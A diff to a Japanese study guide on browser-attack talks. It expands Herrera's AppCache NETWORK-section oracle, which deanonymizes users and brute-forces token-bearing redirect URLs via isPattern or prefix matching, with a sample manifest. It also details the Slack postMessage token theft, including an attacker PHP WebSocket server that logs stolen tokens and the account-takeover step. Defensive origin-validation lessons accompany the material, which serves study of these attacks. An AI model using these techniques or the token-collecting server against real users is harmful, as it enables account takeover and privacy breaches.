@@ -213,7 +213,25 @@ Herreraの攻撃はRosénと対照的だ。表で整理する。
 | 発火装置 | Cookie爆撃で全ページ500化 | `applicationCache`のイベント／`fetch`のreject |
 | 結末 | 全ブラウザ修正＋廃止加速を主張 | Chrome 93で完全削除され決着 |
 
-Herreraの核心は「NETWORKセクションを置くと、未列挙URLへのリクエストがブロックされ、しかもそれがリダイレクト先にも適用される」＝**許可リスト（allowlist）として働く**という発見だ。これを使えば「あるURLがリダイレクト連鎖に含まれるか」を1ビットのオラクル（判定装置）として観測でき、Chrome独自の `isPattern` glob と組み合わせてリダイレクト先URL（セッショントークンやCSRFトークンを含む）を1文字ずつブルートフォースできた。報奨は CVE-2020-6399 と CVE-2021-21168 で合計 **$10,000**。
+まず前提として、AppCacheのマニフェストには **CACHE / NETWORK / FALLBACK** の3セクションと、Chrome独自の **CHROMIUM-INTERCEPT**（HTML標準には存在せず、Chromeが標準から逸脱して独自実装したセクション）がある。Rosénが悪用したFALLBACKとChromiumのCHROMIUM-INTERCEPTは**同一オリジンのURLしかエントリにできない**ため、Herreraはクロスオリジンで効かせるべく、これらを捨ててNETWORKセクションに注目した。
+
+Herreraの核心は「NETWORKセクションを置くと、未列挙URLへのリクエストがブロックされ、しかもそれがリダイレクト先にも適用される」＝**許可リスト（allowlist）として働く**という発見だ。これを使えば「あるURLがリダイレクト連鎖に含まれるか」を1ビットのオラクル（判定装置）として観測できる。
+
+具体例が **deanonymization（ユーザー名の特定）** だ。NETWORKに `https://www.facebook.com/me` と `https://www.facebook.com/victim` だけを載せておく。`/me` は自分のプロフィール（例 `/victim`）へリダイレクトされるので、ログイン済みなら「`/victim` が許可リストに載っている」ため `/me` へのfetchが成功し、載っていなければネットワークエラーになる。これで被害者のユーザー名が `victim` かどうかを1件ずつ判定できる。
+
+さらにHerreraは、Chrome独自の **`isPattern`** に目をつけた。`isPattern` とは、**AppCacheのエントリ末尾に付けるとそのエントリがglob（ワイルドカード）照合になるChrome独自の記法**のこと。たとえば `https://www.facebook.com/vi*tim isPattern` は `vi` と `tim` の間に任意文字列を許す。
+
+```text
+CACHE MANIFEST
+
+NETWORK:
+https://www.facebook.com/me
+https://www.facebook.com/vi*tim isPattern
+```
+
+これを許可リスト挙動と組み合わせると、リダイレクト先URL（セッショントークンやCSRFトークンを含む）を**1文字ずつブルートフォース**できる。`a* isPattern` でネットワークエラーなら1文字目は `a` ではない、`v*` で成功なら1文字目は `v`、という具合だ。1マニフェストに文字集合の半分を並べれば二分探索でき、試行回数を対数に減らせる。
+
+後日談として、Herreraは**`isPattern` を使わなくても、AppCache仕様がURLを「プレフィクス（先頭一致）」で照合する欠陥**により同じ攻撃が再成立することを発見した。`NETWORK:` に `https://facebook.com/v` と書くと、`/v`・`/vi`・`/vic`…`/victim` はすべて許可され `/anothervictim` は拒否される＝プレフィクス一致がそのままオラクルになる。報奨は CVE-2020-6399 と CVE-2021-21168 で合計 **$10,000**。
 
 > ### 📌 ここは自分で開いて読んでください
 > **資料**: AppCache's forgotten tales（Luan Herrera, 2021-05-31） — https://blog.lbherrera.me/posts/appcache-forgotten-tales/
@@ -613,15 +631,17 @@ setInterval(function(){
 
 ```sh
 curl https://api.stripe.com/v1/charges \
-  -u sk_test_REDACTED_EXAMPLE_KEY_EXAMPLE_KEY: \
+  -u sk_test_REDACTED_EXAMPLE_KEY_EXAMPLE_KEY_EXAMPLE_KEY: \
   -d amount=999 -d currency=usd \
   -d description="Example charge" \
-  -d source=tok_REDACTED_EXAMPLE_EXAMPLE
+  -d source=tok_REDACTED_EXAMPLE_EXAMPLE_EXAMPLE
 ```
 
 Rosénの補足（スライド130）: 「openerからの、他2つのpostMessage呼び出しの間に割り込むpostMessage」で、「自分の知る限りChromeだけがこれを許すようだ」。ブラウザによってメッセージイベントの配送順序に差があり、当時Chromeがこの割り込みを許していた。
 
 > **どう守るか**: postMessageのハンドシェイクだけで信頼を固定してはいけない。**すべての受信メッセージで毎回 `event.origin` を完全一致で検証**し、`event.source` の同一性も確認する。オリジン判定を自作の正規表現で書かない（`URL` APIでホスト名を取り出して等値比較する）。`.replace` の単一置換や `.*` アンカーの甘さは、オリジン検証レビューの定番チェック項目にする。
+
+> 〔補足・発展演習〕本トークそのものには含まれないが、同時期のRosénの公開報告として **HackerOne #207042**（`https://hackerone.com/reports/207042` 、postMessageによるframe-jumping＋jQuery-JSONPを組み合わせたXSS）がある。トークの内容ではないので混同してはならないが、postMessage章の追加の読み物・演習素材として目を通すとよい。
 
 ---
 
@@ -655,6 +675,8 @@ _.event.dispatch.apply(a,arguments):void 0}
 - 異なるウィンドウ間の通信を `diffwin` で追跡し、「メッセージ再送に使えるパス」でウィンドウを特定できる。
 - 無名関数は `bound` 文字列として表示（Chromeが文字列化できないため）。
 
+READMEの「Known issues（既知の問題）」には、拡張自身の実装ハマりどころも記録されている。当初はXHTML（`application/xml`）のようなXML系ドキュメントにもコンテンツスクリプトを注入して不具合を起こしていたため、「`document.contentType` が `application/xml` の場合はコンテンツスクリプトをDOMに追加しない」よう修正された。ツール開発側にも「注入先ドキュメントの種別を見分ける」という細かな配慮が要る、という実例だ。
+
 ---
 
 ## 6. スライドに無い口頭パート: Slackトークン窃取
@@ -672,6 +694,21 @@ b.postMessage({"origin_window_type":"incoming_call","message_type":"ms_msg","msg
 b.postMessage({"origin_window_type":"incoming_call","message_type":"ms_msg","msg":{"reply_to":false,"type":"goodbye"}}, "*")
 ```
 
+いくつか成立条件がある。`reconnect_url` を送っても既存接続があるうちは即再接続しないので、`goodbye` で切断させて再接続を誘発する。これが効くのは、Slack側の設定フラグ `TS.ms.fast_reconnects_enabled` が `true` だったからだ（`false` なら `reconnect_url` の処理自体が return で打ち切られる）。
+
+攻撃者側のWebSocketサーバは PHP の Ratchet（socketo.me）で立て、接続が来た瞬間にクエリの `token` をファイルへ書き出す。
+
+```php
+public function onOpen(ConnectionInterface $conn) {
+    $this->clients->attach($conn);
+    $token = $conn->WebSocket->request->getQuery()['token'];
+    echo sprintf("WE GOT TOKEN: %s\n", $token);
+    file_put_contents('token.txt', $token);
+}
+```
+
+トークンをダンプしたら攻撃はまだ終わりではない。攻撃者は取得した `xoxs` トークンで Slack の **`auth.test` エンドポイント**に問い合わせ、正当なトークンであることを確認して**アカウント乗っ取りを完了**する。ここまでが動画で語られた完全な連鎖だ。
+
 Slackの修正は、送信元オリジンのホスト名を自ドメインと等値比較するものだった。
 
 ```javascript
@@ -679,6 +716,8 @@ verifyOriginUrl: function(originHref) {
     return TS.utility.url.getHostName(originHref) == window.location.hostname
 },
 ```
+
+ただし話には続きがある。この修正の後、**別の報告者が「空の `event.origin` でもメッセージを投稿できる」バイパスを発見**し（`getHostName` に空URLを渡すと空文字が返り、`window.location.hostname` が空になり得るケースなどを突く経路）、Slackは `verifyOriginUrl` の実装をさらに訂正した。ここから読み取れる防御教訓は重い。**一度の修正は不完全でありうる**こと、そしてオリジン検証では**空文字・null・未定義のオリジン**という「空origin問題」を必ず潰しておくこと、である。origin検証コードは「空文字を渡されたら安全側（拒否）に倒れるか」を毎回確認するべきだ。
 
 > ### 📌 ここは自分で開いて読んでください
 > **資料**: Hacking Slack using postMessage and WebSocket-reconnect to steal your precious token — https://labs.detectify.com/2017/02/28/hacking-slack-using-postmessage-and-websocket-reconnect-to-steal-your-precious-token/
@@ -782,7 +821,7 @@ verifyOriginUrl: function(originHref) {
 - https://hackerone.com/reports/207042
 
 <!-- sources: https://speakerdeck.com/fransrosen/owasp-appseceu-2018-attacking-modern-web-technologies, https://www.youtube.com/watch?v=vRqcUS4CPFs, https://www.youtube.com/watch?v=oJCCOnF25JU, https://github.com/fransr/postMessage-tracker, https://labs.detectify.com/2017/02/28/hacking-slack-using-postmessage-and-websocket-reconnect-to-steal-your-precious-token/, https://bugs.chromium.org/p/chromium/issues/detail?id=696806#c40, https://blog.mozilla.org/security/2018/02/12/restricting-appcache-secure-contexts/, https://blog.lbherrera.me/posts/appcache-forgotten-tales/, https://gist.github.com/lbherrera/6e549dcf49334b637c22d76518a90ff6, https://hackerone.com/reports/207170 -->
-<!-- terms: AppCache, FALLBACK, Cookie爆撃, Service Worker, アップロードポリシー, 署名付きポリシー, starts-with, パストラバーサル, postMessage, 同一オリジンポリシー, オリジン検証, クライアントサイドレースコンディション, INITダンス, postMessage-tracker, XS-Leak, MIMEスニッフィング, サンドボックスドメイン, ClickTale, dynamicEventName -->
+<!-- terms: AppCache, FALLBACK, NETWORKセクション, CHROMIUM-INTERCEPT, isPattern, Cookie爆撃, Service Worker, アップロードポリシー, 署名付きポリシー, starts-with, 署名URL, パストラバーサル, postMessage, 同一オリジンポリシー, オリジン検証, 空origin問題, クライアントサイドレースコンディション, INITダンス, postMessage-tracker, XS-Leak, deanonymization, MIMEスニッフィング, サンドボックスドメイン, ClickTale, dynamicEventName, reconnect_url, xoxsトークン -->
 <!-- self-read: https://www.youtube.com/watch?v=vRqcUS4CPFs | YouTubeがegressプロキシで全面ブロック（字幕API・アーカイブも403） -->
 <!-- self-read: https://blog.lbherrera.me/posts/appcache-forgotten-tales/ | 原URLがサイト側制限で取得不可、ミラーで代替 -->
 <!-- self-read: https://labs.detectify.com/2017/02/28/hacking-slack-using-postmessage-and-websocket-reconnect-to-steal-your-precious-token/ | スライド未収録の動画限定事例、原典はブログ -->
